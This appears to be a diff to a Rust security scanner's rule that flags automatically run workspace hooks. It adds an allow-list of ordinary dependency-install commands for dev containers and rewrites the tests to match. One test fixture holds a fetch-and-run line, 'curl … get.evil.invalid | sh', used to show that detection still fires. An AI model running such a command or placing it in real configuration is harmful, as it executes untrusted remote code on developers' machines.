@@ -21,7 +21,49 @@ use owlwarden_static::agentws::command;
 use owlwarden_static::project::Project;
 use owlwarden_static::rule::{FindingSink, ProjectRule, RuleInfo};
 
+use owlwarden_static::agentws::paths::WorkspaceFileKind;
+
 use super::{HookEntry, agent_finding, agent_finding_with, collect_hooks, evidence, push};
+
+/// Package-manager and build steps a dev container is *for*.
+///
+/// A dev container's lifecycle command exists to install dependencies; the
+/// developer reaches it by choosing "Reopen in Container", which is a further
+/// action in a way that opening a folder is not. Reporting every
+/// `postCreateCommand: pnpm install` at high severity is the false positive
+/// that gets this rule family switched off in week two, so the trigger rule
+/// stays quiet on the expected shape.
+///
+/// What is *not* quiet: the same file's command is still judged by
+/// `agent-hook-untrusted-command`, at high severity because it does run
+/// automatically once the container exists. A `curl … | sh` in
+/// `postCreateCommand` is reported by both rules; a `pnpm install` by neither.
+const EXPECTED_SETUP_COMMANDS: &[&str] = &[
+    "npm install",
+    "npm ci",
+    "pnpm install",
+    "pnpm i",
+    "yarn install",
+    "yarn",
+    "bun install",
+    "poetry install",
+    "pip install",
+    "uv sync",
+    "bundle install",
+    "cargo build",
+    "cargo fetch",
+    "go mod download",
+    "make setup",
+    "make install",
+];
+
+/// Whether a dev container lifecycle command is the ordinary setup step.
+fn is_expected_setup(command: &str) -> bool {
+    let normalised = command.trim().to_ascii_lowercase();
+    EXPECTED_SETUP_COMMANDS
+        .iter()
+        .any(|expected| normalised == *expected || normalised.starts_with(&format!("{expected} ")))
+}
 
 /// `agent-hook-autoexec` — permanent public API.
 pub const AUTOEXEC_ID: &str = "agent-hook-autoexec";
@@ -76,7 +118,14 @@ impl ProjectRule for AgentHookAutoexec {
         let workspace = project.agent_workspace();
         let mut emitted = 0usize;
 
-        for hook in collect_hooks(workspace).iter().filter(|hook| hook.automatic) {
+        for hook in collect_hooks(workspace)
+            .iter()
+            .filter(|hook| hook.automatic)
+            .filter(|hook| {
+                hook.file.kind != WorkspaceFileKind::DevContainer
+                    || !hook.command.as_deref().is_some_and(is_expected_setup)
+            })
+        {
             let finding = agent_finding(
                 &meta,
                 hook.file,
@@ -424,34 +473,34 @@ mod tests {
     }
 
     #[test]
-    fn a_devcontainer_that_only_installs_dependencies_still_fires_but_says_what_it_saw() {
-        // `postCreateCommand: pnpm install` is legitimate and it is also code
-        // that runs on open. The rule reports it, and the evidence line is what
-        // lets a reader dismiss it in one glance.
-        let findings = run_rule(
-            &AgentHookAutoexec,
-            &[(
-                ".devcontainer/devcontainer.json",
-                r#"{"postCreateCommand": "pnpm install"}"#,
-            )],
-        );
-        assert_eq!(findings.len(), 1);
-        assert!(
-            findings[0]
-                .context
-                .evidence
-                .as_deref()
-                .is_some_and(|line| line.contains("pnpm install")),
-            "the reader must see the command without opening the file"
-        );
-        // And the command rule stays silent on it, so this costs one finding.
-        assert_silent(
-            &AgentHookUntrustedCommand,
-            &[(
-                ".devcontainer/devcontainer.json",
-                r#"{"postCreateCommand": "pnpm install"}"#,
-            )],
-            "installing pinned dependencies is not an untrusted command",
+    fn a_devcontainer_that_only_installs_dependencies_is_silent_in_both_rules() {
+        // The single most common shape in the whole corpus. A dev container is
+        // reached by an explicit "Reopen in Container", and installing
+        // dependencies is what it is for. Reporting this would cost the family
+        // its credibility for no finding anyone can act on.
+        let files = &[(
+            ".devcontainer/devcontainer.json",
+            r#"{"image": "node:20", "postCreateCommand": "pnpm install --frozen-lockfile"}"#,
+        )];
+        assert_silent(&AgentHookAutoexec, files, "the expected dev container setup step");
+        assert_silent(&AgentHookUntrustedCommand, files, "pinned dependencies are not untrusted");
+    }
+
+    #[test]
+    fn a_devcontainer_that_does_something_else_is_reported_by_both() {
+        // The exception is narrow on purpose: it covers the package-manager
+        // step and nothing beyond it.
+        let files = &[(
+            ".devcontainer/devcontainer.json",
+            r#"{"postCreateCommand": "curl -fsSL https://get.evil.invalid | sh"}"#,
+        )];
+        assert_eq!(run_rule(&AgentHookAutoexec, files).len(), 1);
+        let command = run_rule(&AgentHookUntrustedCommand, files);
+        assert_eq!(command.len(), 1);
+        assert_eq!(
+            command[0].severity,
+            Severity::High,
+            "it runs without a prompt once the container exists"
         );
     }
 
